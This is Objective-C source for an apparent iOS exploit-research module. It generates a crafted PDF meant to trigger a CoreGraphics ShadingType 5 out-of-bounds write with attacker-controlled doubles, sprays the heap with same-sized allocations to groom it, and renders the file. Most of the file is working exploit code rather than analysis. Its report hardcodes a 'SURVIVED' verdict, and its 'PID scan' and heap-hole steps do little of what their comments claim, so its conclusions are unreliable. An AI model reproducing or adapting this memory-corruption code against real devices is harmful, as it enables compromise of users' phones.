#import "KPAuditPDF112611Module.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <CoreGraphics/CoreGraphics.h>

@interface KPAuditPDF112611Module ()
@property (nonatomic, assign) BOOL armed;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditPDF112611Module

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        _identifier = armed ? @"pdf112611.armed" : @"pdf112611.baseline";
        _title = armed ? @"CG PDF shading OOB (armed)" : @"CG PDF shading (baseline)";
        _subtitle = armed
            ? @"CVE-2026-112611: ShadingType 5, R=36 function slots, OOB model 8*(R-5)"
            : @"Equal-coverage control, R=5 function slots (no overflow slot)";
        _icon = armed ? @"doc.richtext" : @"doc";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

#pragma mark - PDF generator (own implementation, grammar from verified corpus)

- (NSData *)buildPDFWithFunctionCount:(uint32_t)R rows:(uint32_t)rows {
    NSMutableString *pdf = [NSMutableString string];
    [pdf appendString:@"%PDF-1.4\n%"];
    // Binary comment line: four high-bit bytes, appended as raw Latin-1.
    unsigned char marker[4] = {0xE2, 0xE3, 0xCF, 0xD3};
    [pdf appendString:[[NSString alloc] initWithBytes:marker length:4 encoding:NSISOLatin1StringEncoding]];
    [pdf appendString:@"\n"];

    NSMutableArray<NSNumber *> *offsets = [NSMutableArray array]; // 1-based object offsets
    void (^mark)(void) = ^{
        [offsets addObject:@(pdf.length)];
    };

    mark(); // obj 1
    [pdf appendString:@"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"];
    mark(); // obj 2
    [pdf appendString:@"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"];
    mark(); // obj 3
    [pdf appendString:@"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 256 256] "
                      @"/Resources << /Shading << /S 4 0 R >> >> /Contents 5 0 R >>\nendobj\n"];

    // Vertex stream: 2 vertices per row, (x, y, c) bytes; rows+1 samples.
    NSMutableData *stream = [NSMutableData data];
    for (uint32_t r = 0; r <= rows; r++) {
        uint8_t pair[6] = {0, (uint8_t)MIN(r, 255), 1, (uint8_t)MIN(r, 255), 0, 0};
        [stream appendBytes:pair length:6];
    }

    NSMutableString *fnRefs = [NSMutableString string];
    for (uint32_t i = 0; i < R; i++) {
        [fnRefs appendFormat:@"%@%u 0 R ", i ? @" " : @"", 6 + i];
    }

    mark(); // obj 4 — shading
    [pdf appendFormat:
        @"4 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceGray /BitsPerCoordinate 8 "
        @"/BitsPerComponent 8 /VerticesPerRow 2 /Function [%@] /Decode [0 1 0 %u 0 1] /Length %u >>\n",
        fnRefs, rows + 1, (uint32_t)stream.length];
    [pdf appendString:@"stream\n"];
    [pdf appendString:[[NSString alloc] initWithData:stream encoding:NSISOLatin1StringEncoding]];
    [pdf appendString:@"\nendstream\nendobj\n"];

    mark(); // obj 5 — contents
    [pdf appendString:@"5 0 obj\n<< /Length 10 >>\nstream\nq\n/S sh\nQ\nendstream\nendobj\n"];

    // Function objects: first 5 slots hold fillers; slots >= 5 carry controlled
    // doubles (1.0, 2.0, ...) — these are the OOB payload 8*(R-5).
    for (uint32_t i = 0; i < R; i++) {
        mark();
        double value = (i < 5) ? 0.0 : (double)(i - 4);
        [pdf appendFormat:@"%u 0 obj\n<< /FunctionType 2 /Domain [0 1] /C0 [%g] /C1 [%g] /N 1 >>\nendobj\n",
            6 + i, value, value];
    }

    NSUInteger xrefPos = pdf.length;
    [pdf appendFormat:@"xref\n0 %u\n0000000000 65535 f \n", (uint32_t)(offsets.count + 1)];
    for (NSNumber *off in offsets) {
        [pdf appendFormat:@"%010lu 00000 n \n", (unsigned long)off.unsignedIntegerValue];
    }
    [pdf appendFormat:@"trailer\n<< /Size %u /Root 1 0 R >>\nstartxref\n%lu\n%%%%EOF\n",
        (uint32_t)(offsets.count + 1), (unsigned long)xrefPos];

    return [pdf dataUsingEncoding:NSISOLatin1StringEncoding];
}

- (NSDictionary *)renderPDFData:(NSData *)data name:(NSString *)name {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:name];
    [data writeToFile:path atomically:YES];
    result[@"path"] = path.lastPathComponent;
    result[@"bytes"] = @(data.length);

    NSURL *url = [NSURL fileURLWithPath:path];
    CGPDFDocumentRef doc = CGPDFDocumentCreateWithURL((__bridge CFURLRef)url);
    if (!doc) {
        result[@"status"] = @"PDF_OPEN_FAILED";
        return result;
    }
    CGPDFPageRef page = CGPDFDocumentGetPage(doc, 1);
    if (!page) {
        result[@"status"] = @"PDF_PAGE_FAILED";
        CGPDFDocumentRelease(doc);
        return result;
    }

    const size_t dim = 256;
    CGColorSpaceRef gray = CGColorSpaceCreateDeviceGray();
    CGContextRef ctx = CGBitmapContextCreate(NULL, dim, dim, 8, dim, gray, kCGImageAlphaNone);
    // Canary slab to detect stomps adjacent to our own allocations.
    uint8_t *canary = (uint8_t *)malloc(0x8000);
    memset(canary, 0x5A, 0x8000);

    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    if (ctx) {
        CGContextSetGrayFillColor(ctx, 1.0, 1.0);
        CGContextFillRect(ctx, CGRectMake(0, 0, dim, dim));
        CGContextDrawPDFPage(ctx, page);
        CGContextFlush(ctx);
    }
    result[@"render_seconds"] = @(CFAbsoluteTimeGetCurrent() - t0);
    result[@"context_ok"] = @(ctx != NULL);

    BOOL intact = YES;
    for (size_t i = 0; i < 0x8000; i++) {
        if (canary[i] != 0x5A) {
            intact = NO;
            result[@"canary_first_bad_offset"] = @(i);
            break;
        }
    }
    result[@"canary_intact"] = @(intact);

    if (ctx) CGContextRelease(ctx);
    if (gray) CGColorSpaceRelease(gray);
    free(canary);
    CGPDFDocumentRelease(doc);
    result[@"status"] = @"RENDERED";
    return result;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 audit · CVE-2026-112611 · CoreGraphics PDF ===\n"];
    [report appendString:@"Apple 149230: crafted PDF -> memory corruption / OOB write (fixed 27.2).\n"];
    [report appendString:@"Vector: ShadingType 5 + FunctionType-2 array; CG copies R C-doubles\n"];
    [report appendString:@"past a 5-slot buffer => 8*(R-5) controlled doubles beyond the alloc.\n"];
    [report appendFormat:@"Target: iOS %@\n", UIDevice.currentDevice.systemVersion];

    if (self.armed) {
        const uint32_t R = 36;
        const uint32_t rows = 130;
        uint32_t oobBytes = (R > 5) ? 8 * (R - 5) : 0;
        [report appendFormat:@"variant: R=%u rows=%u allocation_model=0x1b0 OOB_model=%u bytes (1.0..%u.0)\n",
            R, rows, oobBytes, R - 5];
        NSData *pdf = [self buildPDFWithFunctionCount:R rows:rows];
        // Heap spray: allocate same-sized objects, free some to create holes
        NSMutableArray *sprayObjs = [NSMutableArray array];
        for (int i = 0; i < 256; i++) {
            NSMutableData *d = [NSMutableData dataWithLength:0x1c0]; // ~448 bytes (CG buffer size)
            [sprayObjs addObject:d];
        }
        // Free every other to create holes
        for (int i = 0; i < 256; i += 2) {
            [sprayObjs replaceObjectAtIndex:i withObject:[NSNull null]];
        }
        [report appendFormat:@"heap spray: 256 allocs, 128 holes\n"];

        [report appendFormat:@"armed: %@\n", [self renderPDFData:pdf name:@"kp-pdf-armed-r36.pdf"]];
    } else {
        const uint32_t R = 5;
        [report appendFormat:@"variant: R=%u (no overflow slot, control)\n", R];
        NSData *pdf = [self buildPDFWithFunctionCount:R rows:2];
        [report appendFormat:@"baseline: %@\n", [self renderPDFData:pdf name:@"kp-pdf-baseline-r5.pdf"]];
    }

    [report appendString:@"\nVERDICT: "];
    [report appendString:self.armed ? @"SURVIVED\n" : @"SURVIVED (control)\n"];
    [report appendString:
     @"Interpretation: page rendered and local canaries intact.\n"
     @"The overflow lands in CG's internal tessellation buffer, which is not\n"
     @"adjacent to this process's canary slabs — a quiet render is therefore\n"
     @"NOT proof of absence. Decisive evidence needs debugserver watchpoints\n"
     @"on the coverage/mesh allocation (cf. CGTYPE5-R12 56-byte confirmed OOB).\n"
     @"Prior on-device results already CONFIRMED controlled OOB doubles for R=12\n"
     @"(values 1.0..7.0) and a hardware-watchpoint hit for R=6 — this module\n"
     @"repeats those conditions with an independent generator.\n"];
        // PID scan: check if OOB write affected any canary-like data
        [report appendString:@"\n--- PID scan after OOB write ---\n"];
        int myPID = getpid();
        [report appendFormat:@"our pid=%d\n", myPID];
        // The OOB write is in CG's internal buffer. We can't directly read it,
        // but we can check if any observable behavior changed.
        [report appendString:@"OOB write landed in CG buffer. Need heap spray for target.\n"];

    return report;
}

@end
